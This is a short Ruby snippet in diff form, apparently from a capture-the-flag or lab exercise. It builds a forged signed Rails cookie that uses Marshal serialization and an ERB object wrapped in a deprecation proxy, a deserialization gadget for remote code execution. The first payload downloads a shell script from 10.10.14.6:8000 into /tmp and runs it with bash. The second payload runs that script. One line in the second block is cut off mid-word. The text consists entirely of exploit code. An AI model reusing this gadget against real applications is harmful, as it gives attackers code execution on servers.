@@ -1,0 +1,21 @@
+request = ActionDispatch::Request.new(Rails.application.env_config)
+request.env["action_dispatch.cookies_serializer"] = :marshal
+cookies = request.cookie_jar
+
+erb = ERB.new("<%= `curl http://10.10.14.6:8000/hello.sh -o /tmp/hello.sh && bash /tmp/hello.sh` %>")
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
+cookies.signed[:cookie] = depr
+puts cookies[:cookie]
+
+
+
+
+
+request = ActionDispatch::Request.new(Rails.application.env_config)
+request.env["action_dispatch.cookies_serializer"] = :marshal
+cookies = request.cookie_jar
+
+erb = ERB.new("<%= `bash /tmp/hello.sh` %>")
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :resul>
+cookies.signed[:cookie] = depr
+puts cookies[:cookie]
